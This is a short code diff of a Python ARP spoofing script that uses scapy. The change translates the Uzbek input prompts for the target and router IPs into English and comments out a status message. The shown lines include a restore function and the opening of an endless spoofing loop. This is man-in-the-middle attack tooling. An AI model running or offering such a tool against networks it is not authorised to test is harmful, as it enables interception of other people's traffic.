@@ -19,13 +19,13 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-target_ip = input("Jabrlanuvchi IP manzilini kiriting >>> ")
-gateway_ip = input("Router IP manzilini kiriting >>> ")
+target_ip = input("Enter target IP >>> ")
+gateway_ip = input("Enter Router IP >>> ")
 
 try:
     send_packet_count = 0
     start_time = datetime.now()
-    print("[+] Spoof boshlandi... CTRL+C bosib to'xtating")
+    #print("[+] Spoof boshlandi... CTRL+C bosib to'xtating")
     
     while True:
         spoof(target_ip, gateway_ip)
